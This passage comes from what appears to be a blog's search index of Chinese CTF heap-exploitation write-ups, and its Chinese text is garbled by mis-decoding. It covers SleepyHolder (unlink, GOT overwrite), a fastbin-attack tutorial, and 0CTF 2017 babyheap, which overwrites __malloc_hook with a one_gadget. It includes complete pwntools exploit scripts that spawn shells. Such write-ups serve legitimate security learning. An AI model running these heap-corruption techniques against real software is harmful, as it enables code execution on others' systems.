ä¸€ä¸ªfake chunkï¼Œå¹¶ä¿®æ”¹big chunkçš„prevsizeé‡Šæ”¾big secretï¼Œè§¦å‘unlinké€šè¿‡è¦†ç›–å †æŒ‡é’ˆï¼Œå°†free_gotè¦†å†™ä¸ºputs_pltï¼Œæ³„éœ²å‡ºatoi_gotçš„åœ°å€ï¼Œä»Žè€Œè®¡ç®—å‡ºlibcçš„åŸºå€ç®—å‡ºsystemçš„åœ°å€ï¼Œå¹¶å°†å…¶å†™å…¥free_gotè°ƒç”¨freeï¼ŒæˆåŠŸgetshellæˆ‘çš„exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./SleepyHolder')elf = ELF('./SleepyHolder')libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')def add(index, content): p.recvuntil('3. Renew secret\n') p.sendline('1') p.recvuntil('\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content) def delete(index): p.recvuntil('3. Renew secret\n') p.sendline('2') p.recvuntil('2. Big secret\n') p.send(str(index))def update(index, content): p.recvuntil('3. Renew secret\n') p.sendline('3') p.recvuntil('2. Big secret\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content)#åˆ†é…chunk1 chunk2add(1, 'a'*0x10)add(2, 'b'*0x10)#é‡Šæ”¾chunk1delete(1)#åˆ†é…chunk3ï¼Œè®©chunk1è¢«ç§»åŠ¨åˆ°unsorted binï¼Œä½¿chunk2çš„inuseä½å˜ä¸º0add(3, 'c'*0x10)#è¿™æ—¶å†é‡Šæ”¾chunk1ï¼Œè®©chunk1é‡æ–°è¿›å…¥fast bindelete(1)heap_ptr = 0x6020d0 #å †æŒ‡é’ˆ#å‡†å¤‡unlinkï¼Œåœ¨chunk1ä¸­ä¼ªé€ chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#å› ä¸ºå†…å­˜å¤ç”¨ï¼Œè¿™é‡Œè®¾ç½®chunk2çš„prev_sizeadd(1, payload)#æ­¤æ—¶chunk2çš„inuseä½æ˜¯0ï¼Œæ‰€ä»¥è§¦å‘unlinkdelete(2)free_got = elf.got['free']atoi_got = elf.got['atoi']puts_got = elf.got['puts']puts = elf.symbols['puts']system_off = libc.symbols['system']atoi_off = libc.symbols['atoi']#unlinkåŽ å †æŒ‡é’ˆè¢«ä¿®æ”¹ï¼Œå‘çŽ°åœ¨æŒ‡é’ˆæ‰€æŒ‡å†…å­˜å†™å…¥æ•°æ®#å°†chunk2æŒ‡é’ˆè¦†ç›–ä¸ºatoi_got#å°†chunk3æŒ‡é’ˆè¦†ç›–ä¸ºputs_got#å°†chunk1æŒ‡é’ˆè¦†ç›–ä¸ºfree_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#å†æ¬¡å‘chunk1å†™å…¥ï¼Œç›¸å½“äºŽå‘free_gotå†™å…¥#è¿™é‡Œå°†free_gotå†™ä¸ºputsupdate(1, p64(puts))#åˆ é™¤chunk2ï¼Œä½†æ˜¯freeçš„gotè¡¨å·²ç»è¢«å†™ä¸ºputsï¼Œæ‰€ä»¥è¿™é‡Œå®žé™…è°ƒç”¨puts(chunk2)#å› ä¸ºchunk2æŒ‡é’ˆè¢«è¦†ç›–ä¸ºatoi_gotï¼Œæ‰€ä»¥è¾“å‡ºçš„æ˜¯atoiçš„å®žé™…åœ°å€#ç”±æ­¤å¯è®¡ç®—å‡ºlibc_basedelete(2)libc_base = u64(p.recv(6) + '\x00\x00') - atoi_off#é€šè¿‡è°ƒè¯•å‘çŽ°ï¼Œè¿™é‡Œåªèƒ½å–6ä¸ªå­—èŠ‚print "libc_base : %#x" % libc_base system = libc_base + system_off#å°†freeçš„gotè¡¨å†™ä¸ºsystemupdate(1, p64(system))#å‘chunk2ä¸­å†™å…¥binsh é‡Šæ”¾chunk2æ—¶ chunk2çš„å†…å®¹ä¼šä½œä¸ºå‚æ•°add(2, '/bin/sh\x00')delete(2)p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šSleepyHolderexpå‚è€ƒï¼šhow2heapã€https://blog.csdn.net/qq_33528164/article/details/80040197]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>å †åˆ©ç”¨</tag>
        <tag>double_free</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å †åˆ©ç”¨å­¦ä¹ ä¹‹fastbin attack]]></title>
    <url>%2Fpost%2F531412d5.html</url>
    <content type="text"><![CDATA[åŽŸç†fastbin attackæ˜¯ä¸€ç±»æ¼æ´žçš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäºŽ fastbin æœºåˆ¶çš„æ¼æ´žåˆ©ç”¨æ–¹æ³•ã€‚ä¸»è¦åˆ©ç”¨äº†fast binçš„å•é“¾è¡¨ç®¡ç†æœºåˆ¶ã€‚ç›¸å…³æºç ï¼šmallocï¼š123456789101112131415161718/* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) &#123; // å¾—åˆ°å¯¹åº”çš„fastbinçš„ä¸‹æ ‡ idx = fastbin_index(nb); // å¾—åˆ°å¯¹åº”çš„fastbinçš„å¤´æŒ‡é’ˆ mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; // åˆ©ç”¨fdéåŽ†å¯¹åº”çš„binå†…æ˜¯å¦æœ‰ç©ºé—²çš„chunkå—ï¼Œ do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); ...è¿™é‡Œé¦–å…ˆæ ¹æ®æ‰€éœ€chunkçš„å¤§å°èŽ·å¾—è¯¥chunkæ‰€å±žfast binçš„indexï¼Œæ ¹æ®è¯¥indexèŽ·å¾—æ‰€éœ€fast binçš„ç©ºé—²chunké“¾è¡¨æŒ‡é’ˆï¼Œç„¶åŽå°†å¤´æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªchunkï¼ˆvictim-&gt;fdï¼‰ä½œä¸ºç©ºé—²chunké“¾è¡¨çš„å¤´éƒ¨ï¼ˆå–å‡ºå¤´éƒ¨çš„chunkï¼‰ã€‚è¿™é‡Œcatomic_compare_and_exchange_val_acqæ˜¯ä½¿ç”¨äº†lock-freeçš„æŠ€æœ¯å®žçŽ°å•å‘é“¾è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªnodeçš„æ“ä½œï¼Œæš‚æ—¶ä¸å¿…å…³æ³¨ã€‚å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™é‡Œæ˜¯é€šè¿‡fdæŒ‡é’ˆæ¥èŽ·å–ä¸‹ä¸€ä¸ªchunkçš„ã€‚æ‰€ä»¥å¦‚æžœå¯ä»¥æŽ§åˆ¶æŸä¸ªfast binä¸­chunkçš„fdæŒ‡é’ˆçš„å€¼ï¼Œé‚£ä¹ˆåœ¨å–å‡ºè¿™ä¸ªchunkåŽï¼ŒfdæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å°†ä¼šä½œä¸ºä¸‹ä¸€ä¸ªå°†è¦è¢«å–å‡ºçš„å†…å­˜ï¼Œå†æ¬¡ç”³è¯·è¿™ä¸ªå¤§å°çš„å†…å­˜ï¼Œä¹Ÿå°±å®žçŽ°äº†åœ¨ä»»æ„åœ°æ–¹åˆ†é…chunkçš„ç›®çš„ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦ç»•è¿‡ä¸€ä¸ªæ£€æŸ¥:12345678910111213// å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„chunkif (victim != 0) &#123; // æ£€æŸ¥å–åˆ°çš„ chunk å¤§å°æ˜¯å¦ä¸Žç›¸åº”çš„ fastbin ç´¢å¼•ä¸€è‡´ã€‚ // æ ¹æ®å–å¾—çš„ victim ï¼Œåˆ©ç”¨ chunksize è®¡ç®—å…¶å¤§å°ã€‚ // åˆ©ç”¨fastbin_index è®¡ç®— chunk çš„ç´¢å¼•ã€‚ if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; ...&#125;mallocä¼šæ£€æŸ¥å–åˆ°çš„chunkçš„sizeæ˜¯å¦æ˜¯ç¬¦åˆè¿™ä¸ªfast binçš„ï¼Œè‹¥æ˜¯ä¸ç¬¦åˆåˆ™ä¼šGGã€‚æ‰€ä»¥æƒ³è¦åœ¨ä»»æ„åœ°æ–¹åˆ†é…ä¸€ä¸ªchunkï¼Œéœ€è¦å…ˆæƒ³åŠžæ³•åœ¨æ­¤å¤„æž„é€ åˆé€‚çš„sizeæ¥é€šè¿‡è¿™ä¸ªæ£€æŸ¥ã€‚å·§å¦™çš„æ˜¯ï¼Œå› ä¸ºæ­¤å¤„æ²¡æœ‰å¯¹å†…å­˜è¿›è¡Œå¯¹é½æ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡é”™ä½çš„æ–¹å¼æ¥æž„é€ å‡ºä¸€ä¸ªå‡çš„sizeå‡ºæ¥ï¼ˆè¯¦è§æ–‡æœ«ç›¸å…³é¢˜ç›®ï¼‰åˆ©ç”¨å‰æå­˜åœ¨å †æº¢å‡ºã€UAFç­‰å¯ä»¥æŽ§åˆ¶å †å—å†…å®¹ï¼ˆfdæŒ‡é’ˆï¼‰çš„æ¼æ´žæ¼æ´žå‘ç”ŸäºŽfast chunkå¯ä»¥åœ¨ç›®æ ‡ä½ç½®æž„é€ å‡ºåˆé€‚çš„sizeæ¥ç»•è¿‡æ£€æŸ¥åˆ©ç”¨è¿‡ç¨‹åœ¨æƒ³è¦åˆ†é…çš„ç›®æ ‡å†…å­˜é™„è¿‘æ‰¾åˆ°æˆ–è€…åˆ©ç”¨é”™ä½æž„é€ ä¸€ä¸ªåˆé€‚çš„sizeï¼Œç”¨äºŽç»•è¿‡æ£€æŸ¥é‡Šæ”¾æŽ‰victimï¼ˆfast chunkï¼‰é€šè¿‡ä»Žä¸Šä¸€ä¸ªchunkæº¢å‡ºæˆ–UAfç­‰æ–¹å¼ä¿®æ”¹victimçš„fdæŒ‡é’ˆï¼Œä½¿fdæŒ‡é’ˆæŒ‡å‘æž„é€ å¥½sizeçš„ç›®æ ‡chunké€šè¿‡ä¸¤æ¬¡åˆ†é…ï¼Œå¾—åˆ°ç›®æ ‡chunké¢˜ç›®0CTF 2017 babyheap]]></content>
      <categories>
        <category>å †åˆ©ç”¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf2017-babyheap writeup]]></title>
    <url>%2Fpost%2F47331c36.html</url>
    <content type="text"><![CDATA[é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼š0CTF 2017çŸ¥è¯†ç‚¹ï¼šfastbin attackï¼Œchunk overlapé¢˜ç›®æ˜¯ä¸€ä¸ªå†…å­˜ç®¡ç†ç³»ç»Ÿï¼Œèƒ½å¢žåˆ æŸ¥æ”¹ã€‚1234567===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand:é¢˜ç›®æ˜¯64ä½ç¨‹åºï¼Œå¼€å¯ä¿æŠ¤æƒ…å†µï¼š123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabledç¨‹åºæ¦‚å†µAllocateå‡½æ•°ï¼š12345678910111213141516171819202122232425262728void __fastcall Allocate(__int64 a1)&#123; signed int i; // [rsp+10h] [rbp-10h] signed int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(_DWORD *)(24LL * i + a1) ) &#123; printf("Size: "); v2 = get_num(); if ( v2 &gt; 0 ) &#123; if ( v2 &gt; 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf("Allocate Index %d\n", (unsigned int)i); &#125; return; &#125; &#125;&#125;é™åˆ¶chunkæœ€å¤§ä¸º4096ï¼Œä½¿ç”¨callocæ„å‘³ç€åˆ†é…æ—¶ä¼šå°†chunkä¸­çš„å†…å®¹æ¸…0ã€‚æœ€åŽå°†æ•°æ®å­˜å…¥ç»“æž„ä½“1234500000000 chunk struc ; (sizeof=0x18, mappedto_6)00000000 inuse dq ?00000008 length dq ?00000010 ptr dq ?00000018 chunk endsFillå‡½æ•°ï¼š1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf("Index: "); result = get_num(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf("Size: "); result = get_num(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf("Content: "); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125;å‘çŽ°æ­¤å¤„æ²¡æœ‰å¯¹sizeè¿›è¡Œé™åˆ¶ï¼Œå­˜åœ¨æº¢å‡ºã€‚å¹¶ä¸”ï¼Œsub_11B2è¿™ä¸ªè¯»å–å­—ç¬¦ä¸²çš„å‡½æ•°æ²¡æœ‰åœ¨å­—ç¬¦ä¸²æœ«å°¾åŠ ä¸Š&#39;\x00&#39;Freeå‡½æ•°ä¸­å°†å †å—é‡Šæ”¾ï¼Œå¹¶å°†æŒ‡é’ˆæ¸…0ï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚dumpå‡½æ•°å°†æŒ‡å®šç´¢å¼•çš„å †å—å†…å®¹è¾“å‡ºæ¼æ´žåˆ†æžæ³„éœ²libcåŸºå€ï¼ˆchunk overlapï¼‰å› ä¸ºåœ¨small binä¸­åªæœ‰ä¸€ä¸ªchunkæ—¶ï¼Œè¿™ä¸ªchunkçš„fdå’Œbkå°†æŒ‡å‘libcä¸­æŸä¸ªåœ°å€ï¼ˆ&amp;main_arena+88ï¼‰,æ‰€ä»¥åªè¦èƒ½å¤Ÿè¾“å‡ºfdæˆ–è€…bkï¼Œå°±èƒ½æ³„éœ²å‡ºlibcçš„åŸºå€ã€‚123456780x555555757000 PREV_INUSE &#123; prev_size = 0, size = 209, fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, &lt;== libcä¸­çš„åœ°å€ bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;é—®é¢˜çš„å…³é”®è½¬ç§»åˆ°å¦‚ä½•è¾“å‡ºfdå’Œbkã€‚å› ä¸ºå­˜åœ¨å †æº¢å‡ºï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä»Žchunk0æº¢å‡ºåˆ°chunk1ï¼Œä¿®æ”¹chunk1çš„sizeï¼Œä½¿sizeå˜å¤§ä»Žè€Œé€ æˆoverlapï¼Œè®©chunk2çš„å¤´éƒ¨åŒ…å«åœ¨chunk1ä¸­ï¼Œç„¶åŽå°±å¯ä»¥é€šè¿‡æ‰“å°chunk1æ¥æ³„éœ²libcäº†fastbin attackå…ˆå°†chunk1é‡Šæ”¾ï¼Œé€šè¿‡ä»Žchunk0æº¢å‡ºåˆ°chunk1çš„fdï¼Œé€šè¿‡æŽ§åˆ¶chunk1çš„fdï¼Œåˆ™å¯ä»¥åœ¨å‡ ä¹Žä»»æ„åœ°æ–¹åˆ†é…chunkã€‚å› ä¸ºç¨‹åºå¼€å¯PIEå’ŒRELROï¼Œæ‰€ä»¥æ²¡åŠžæ³•åˆ©ç”¨gotè¡¨ï¼Œåˆ™è€ƒè™‘malloc_hookæˆ–è€…free_hookç­‰ã€‚è¿™é‡Œéœ€è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä»Žfast binåˆ†é…chunkæ—¶ï¼Œä¼šæ£€æŸ¥å–åˆ°çš„chunkå¤§å°æ˜¯å¦ä¸Žç›¸åº”çš„fastbinç´¢å¼•ä¸€è‡´ï¼ˆæºç å¦‚ä¸‹ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´è‹¥è¦åœ¨æŸä¸ªåœ°æ–¹åˆ†é…chunkï¼Œéœ€è¦å…ˆåœ¨è¿™ä¸ªåœ°æ–¹æž„é€ å¥½sizeï¼Œä½¿è¿™ä¸ªsizeæ°å¥½å±žäºŽchunkæ‰€åœ¨çš„fastbinã€‚1234567891011 // å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„chunkif (victim != 0) &#123; // æ£€æŸ¥å–åˆ°çš„ chunk å¤§å°æ˜¯å¦ä¸Žç›¸åº”çš„ fastbin ç´¢å¼•ä¸€è‡´ã€‚ // æ ¹æ®å–å¾—çš„ victim ï¼Œåˆ©ç”¨ chunksize è®¡ç®—å…¶å¤§å°ã€‚ // åˆ©ç”¨fastbin_index è®¡ç®— chunk çš„ç´¢å¼•ã€‚ if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125;å·§å¦™çš„æ˜¯ï¼Œåœ¨malloc_hookçš„å‰é¢ï¼Œæœ‰ç±»ä¼¼è¿™æ ·çš„æ•°æ®:1230x7ffff7dd3720 &lt;__memalign_hook&gt;: 0x00007ffff7a94fc0 0x00000000000000000x7ffff7dd3730 &lt;__realloc_hook&gt;: 0x00007ffff7a94f60 0x00000000000000000x7ffff7dd3740 &lt;__malloc_hook&gt;: 0x00007ffff7a94f20 0x0000000000000000åˆå› ä¸ºè¿™é‡Œå¹¶æ²¡æœ‰å¯¹é½æ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡åˆ©ç”¨æ²¡æœ‰å¯¹é½çš„æ•°æ®æ¥é€šè¿‡æ£€æµ‹ã€‚é€šè¿‡æˆªå–ä¸Šé¢æ•°æ®çš„7fï¼Œå’ŒåŽé¢çš„00æ‹¼åœ¨ä¸€èµ·ï¼Œå˜æˆ:1230x7ffff7dd371d: 0xfff7a94fc0000000 0x000000000000007f0x7ffff7dd372d: 0xfff7a94f60000000 0x000000000000007f0x7ffff7dd373d: 0xfff7a94f20000000 0x000000000000007fè¿™æ ·å°±æž„é€ å‡ºäº†ä¸€ä¸ªsizeä¸º0x7fçš„chunkã€‚è¿™æ ·å°±å¯ä»¥åœ¨è¿™åˆ†é…ä¸€ä¸ªå¤§å°ä¸º0x7fçš„chunkï¼Œç„¶åŽä»Žè¿™å†™å…¥ï¼Œè¦†ç›–ä¸€å®šçš„æ— æ•ˆæ•°æ®å°±èƒ½åˆ°è¾¾malloc_hookçš„åœ°å€ï¼Œç„¶åŽå‘malloc_hookä¸­å†™å…¥one_gadgetå°±å¯ä»¥getshelläº†ã€‚ï¼ˆäº†è§£one_gadgetï¼‰æ¼æ´žåˆ©ç”¨åˆ†é…ä¸¤ä¸ªchunk,å¤§å°åˆ†åˆ«ä¸º0x60å’Œ0x40ï¼ˆç¬¬äºŒä¸ªchunkè¾ƒå°æ˜¯ä¸ºäº†ä¹‹åŽèƒ½å¤Ÿæ”¹å¤§ï¼Œè€Œåˆä¸è¶…è¿‡fastbiné™åˆ¶ï¼‰ä»Žchunk0æº¢å‡ºåˆ°chunk1çš„sizeï¼Œå°†å…¶æ”¹æˆ0x70ï¼Œä½¿chunk1è¦†ç›–çš„èŒƒå›´å˜å¤§ã€‚ä½†æ­¤æ—¶è¿˜å¹¶æ²¡æœ‰çœŸæ­£å˜å¤§ï¼Œè¦é‡Šæ”¾åŽé‡æ–°åˆ†é…å‡ºæ¥æ‰èƒ½ç”Ÿæ•ˆã€‚å†åˆ†é…ä¸¤ä¸ªchunkï¼Œchunk2éœ€è¦æ˜¯small chunkï¼Œchunk3æ˜¯ç”¨æ¥éš”å¼€top chunkï¼Œé˜²æ­¢é‡Šæ”¾chunk2æ—¶è¢«top chunkåˆå¹¶ã€‚å› ä¸ºåœ¨freeçš„æ—¶å€™ä¼šæ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„sizeæ˜¯å¦å¤§äºŽ2*size_szå¹¶ä¸”å°äºŽsystem_memï¼ˆæºç å¦‚ä¸‹ï¼‰ï¼Œæ‰€ä»¥è¿˜è¦åœ¨chunk2ä¸­æž„é€ ä¸€ä¸ªfake size12345678910// ä¸‹ä¸€ä¸ªchunkçš„å¤§å°nextsize = chunksize(nextchunk);// next chunk size valid check// åˆ¤æ–­ä¸‹ä¸€ä¸ªchunkçš„å¤§å°æ˜¯å¦ä¸å¤§äºŽ2*SIZE_SZï¼Œæˆ–è€…// nextsizeæ˜¯å¦å¤§äºŽç³»ç»Ÿå¯æä¾›çš„å†…å­˜if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout;&#125;å°†chunk1é‡Šæ”¾ï¼Œå¹¶é‡æ–°åˆ†é…ä¸€ä¸ªå¤§å°0x60çš„chunkï¼Œè¿™é‡Œchunk1è¢«å–å›žå¹¶æˆåŠŸæ‰©å¤§ã€‚å› ä¸ºä½¿ç”¨çš„callocä¼šåˆå§‹åŒ–å†…å­˜ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ¢å¤ä¸€ä¸‹chunk2çš„å‰20ä¸ªå­—èŠ‚é‡Šæ”¾chunk2ï¼Œchunk2è¿›å…¥small binæ‰“å°chunk1ï¼Œæ³„éœ²å‡ºlibcçš„åŸºå€é€šè¿‡libcåŸºå€è®¡ç®—å‡ºmalloc_hookçš„åœ°å€å’Œone_gadgetçš„åœ°å€é‡Šæ”¾æŽ‰chunk1ï¼Œé€šè¿‡æº¢å‡ºchunk0æ¥ä¿®æ”¹chunk1çš„fdï¼Œå°†fdä¿®æ”¹åˆ°malloc_hooké™„è¿‘é€šè¿‡ä¸¤æ¬¡åˆ†é…ï¼Œå¾—åˆ°malloc_hooké™„è¿‘çš„chunkå‘malloc_hookä¸­å†™å…¥one_gadgetï¼ŒæˆåŠŸgetshellexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding:utf-8 -*-from pwn import *p = process('./0ctfbabyheap')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Allocate(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def Fill(index, content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content) + 1)) p.recvuntil('Content: ') p.sendline(content)def Free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def Dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: \n') data = p.recvline() return datadef leak_libc(): Allocate(0x60) #0 Allocate(0x40) #1 #ä»Žchunk0æº¢å‡ºï¼Œå°†chunk1çš„sizeæ”¹ä¸º0x71ï¼Œä½¿chunk1è¦†ç›–èŒƒå›´æ›´å¤§ payload = 'a'*0x60 + p64(0) + p64(0x71) Fill(0, payload) #åˆ†é…ä¸€ä¸ª0x100çš„smallchunk å†åˆ†é…ä¸€ä¸ªchunkæ˜¯ä¸ºäº†é˜²æ­¢free smallchunkæ—¶è¢«topchunkåˆå¹¶ #è¯¥smallchunkçš„chunkhead(0x10ä¸ªå­—èŠ‚)å’Œfdã€bk(0x10ä¸ªå­—èŠ‚)éƒ½åœ¨ä¿®æ”¹åŽçš„chunk1çš„æ•°æ®åŒº #æŽ¥ä¸‹æ¥è¦å°†chunk1é‡Šæ”¾æŽ‰å†åˆ†é…ä½¿chunk1èŒƒå›´çœŸæ­£æ‰©å¤§ #ä½†é‡Šæ”¾æ—¶ä¼šæ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„sizeæ˜¯å¦å¤§äºŽ2*size_szä¸”å°äºŽsystem_mem #æ‰€ä»¥è¿˜å¾—æž„é€ ä¸€ä¸‹next size Allocate(0x100) #2 Allocate(0x60) #3 payload = 'a'*0x10 + p64(0) + p64(0x71) Fill(2, payload) #é‡Šæ”¾chunk1å¹¶é‡æ–°åˆ†é…å›žæ¥ï¼Œå› ä¸ºallocä¼šåˆå§‹åŒ–å†…å­˜ï¼Œæ‰€ä»¥smallchunkçš„å‰0x20ä¸ªå­—èŠ‚è¢«æ¸…ç©º #æ¢å¤smallchunkçš„å‰0x20ä¸ªå­—èŠ‚ Free(1) Allocate(0x60) #1 payload = 'a'*0x40 + p64(0) + p64(0x111) Fill(1, payload) #é‡Šæ”¾smallchunk å› ä¸ºå½“smallbinæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ æ‰€ä»¥å½“å…¶ä¸­åªæœ‰ä¸€ä¸ªchunkæ—¶ #è¯¥chunkçš„fdå’Œbkéƒ½æŒ‡å‘å¤´ç»“ç‚¹ å¤´ç»“ç‚¹å­˜åœ¨äºŽmain_arenaä¸­ main_arenaåˆå­˜åœ¨äºŽlibcä¸­ #æ‰€ä»¥fdå’ŒbkæŒ‡å‘çš„æ˜¯libcä¸­çš„æŸä¸ªåœ°å€ é€šè¿‡å›ºå®šçš„åç§» åˆ™å¯ä»¥æ³„éœ²å‡ºlibc_base Free(2) leaked = u64(Dump(1)[-9:-1]) - 0x3C27B8 print "libc_base : %#x" % (leaked) return leakeddef fastbin_attack(libc_base): #malloc_hook å¯ä»¥åœ¨gdbä¸­ x/32gx (long long)(&amp;main_arena)-0x40 æ¥æ‰¾åˆ° malloc_hook = libc_base + libc.symbols['__malloc_hook'] #ä½¿ç”¨ one_gadget æ‰¾åˆ°execve('/bin/sh') execve_addr = libc_base + 0x4647c print "malloc_hook : %#x" % malloc_hook print "execve_addr : %#x" % execve_addr #é‡Šæ”¾æŽ‰chunk1 é€šè¿‡æº¢å‡ºchunk0æ¥ä¿®æ”¹chunk1çš„fd #é€šè¿‡æŽ§åˆ¶chunk1çš„fd åˆ™å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹åˆ†é…å†…å­˜ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŽ§åˆ¶malloc_hook #å› ä¸ºmallocä¼šæ£€æŸ¥fastbinä¸­chunkçš„sizeæ˜¯å¦å±žäºŽè¿™ä¸ªfastbin #è€Œmalloc_hookå¤„çš„å€¼ä¸º0 ä¸èƒ½é€šè¿‡æ£€æŸ¥ #é€šè¿‡å‰æ–‡æåˆ°çš„æœªå¯¹é½çš„æ•°æ®æ¥ç»•è¿‡æ£€æŸ¥ #è¿™æ ·å°±å¯ä»¥èŽ·å¾—ä¸€ä¸ªsizeä½ä¸º0x7fçš„chunk Free(1) payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0) Fill(0, payload) #é€šè¿‡ä¸¤æ¬¡åˆ†é… å¾—åˆ°malloc_hooké™„è¿‘çš„chunk Allocate(0x60) Allocate(0x60) #è¦†ç›–ä¸€å®šçš„æ— æ•ˆæ•°æ®åˆ°è¾¾malloc_hookçš„åœ°å€ å‘å…¶ä¸­å†™å…¥execve_addr payload = p8(0)*3 + p64(execve_addr) Fill(2, payload) #mallocæ—¶åˆ¤æ–­malloc_hookä¸ä¸º0 æ‰§è¡Œmalloc_hookæŒ‡å‘çš„ä»£ç  getshell Allocate(0x60)libc_base = leak_libc()fastbin_attack(libc_base)p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼š0ctf_babyheapwriteupå‚è€ƒï¼šAncietyå¸ˆå‚…çš„åšå®¢]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>å †åˆ©ç”¨</tag>
        <tag>ctfwiki</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Asis2016-b00ks writeup]]></title>
    <url>%2Fpost%2Fb6745c59.html</url>
